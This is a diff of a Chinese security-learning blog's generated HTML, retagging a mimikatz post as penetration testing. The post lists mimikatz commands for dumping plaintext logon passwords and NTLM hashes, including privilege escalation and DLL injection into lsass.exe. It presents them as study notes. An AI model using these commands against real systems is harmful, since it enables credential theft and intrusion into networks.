@@ -261,7 +261,7 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
     
 </div>
                 
@@ -397,7 +397,8 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <h1 id="mimikatz常用命令"><a href="#mimikatz常用命令" class="headerlink" title="mimikatz常用命令"></a>mimikatz常用命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">system::user        &#x2F;&#x2F;查看当前登录的用户</span><br><span class="line">process::list       &#x2F;&#x2F;列出进程</span><br><span class="line">process::stop processname &#x2F;&#x2F;结束进程（有些进程结束不了，即使权限够大）</span><br><span class="line">process::suspend  processname &#x2F;&#x2F;暂停进程</span><br><span class="line">process::modules      &#x2F;&#x2F;列出系统核心模块和其所在的物理路径</span><br><span class="line">service::list       &#x2F;&#x2F;列出系统服务</span><br><span class="line">service::stop(start) service_name   &#x2F;&#x2F;停止（开启）服务</span><br><span class="line">privilege::list   &#x2F;&#x2F;列出系统权限列表</span><br><span class="line">privilege::debug   &#x2F;提升权限 （执行这条命令得有足够的权限）</span><br><span class="line">nogpo::cmd       &#x2F;&#x2F;打开cmd</span><br><span class="line">nogpo::regedit   &#x2F;&#x2F;打开注册表</span><br><span class="line">ts::sessions     &#x2F;&#x2F;显示当前回话</span><br><span class="line">ts::processes    &#x2F;&#x2F;显示当前进程及其PID</span><br><span class="line">sekurlsa::logonpasswords   &#x2F;&#x2F;获取当前在线用户的明文密码（需要高权限运行）</span><br><span class="line">lsadump::lsa &#x2F;patch       &#x2F;&#x2F;获取当前此计算机存在过用户的NTLMHASH</span><br><span class="line">inject::process lsass.exe &#39;路径&#39; sekurlsa.dll &#x2F;&#x2F;进程注入（如果用1.0版本获取hash的时候发现sekurlsa模块存在，就可以用进程注入一个dll文件，然后在获取hash）</span><br></pre></td></tr></table></figure>
-<h1 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h1><p>1.首先以管理员身份运行mimikatz.exe</p>
+
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.首先以管理员身份运行mimikatz.exe</p>
 <p>2.运行下面指令，即可得到当前内网中的所有密码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug           &#x2F;&#x2F;提升权限</span><br><span class="line">sekurlsa::logonpasswords   &#x2F;&#x2F;抓取密码</span><br></pre></td></tr></table></figure>
 
@@ -542,7 +543,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mimikatz常用命令"><span class="toc-number">1.</span> <span class="toc-text">mimikatz常用命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#使用："><span class="toc-number">2.</span> <span class="toc-text">使用：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mimikatz常用命令"><span class="toc-number">1.</span> <span class="toc-text">mimikatz常用命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#使用"><span class="toc-number">2.</span> <span class="toc-text">使用</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -2536,10 +2537,9 @@ top:50vh;
     
     
     
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 122
+        Total : 123
         </div>
         <!-- search  -->
         
@@ -2552,6 +2552,11 @@ top:50vh;
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/26</span><a class="archive-post-title" href= "/2021/05/26/RASP-learn/" >理解RASP技术</a>
+        </li>
     
     
         <li class="archive-post-item">
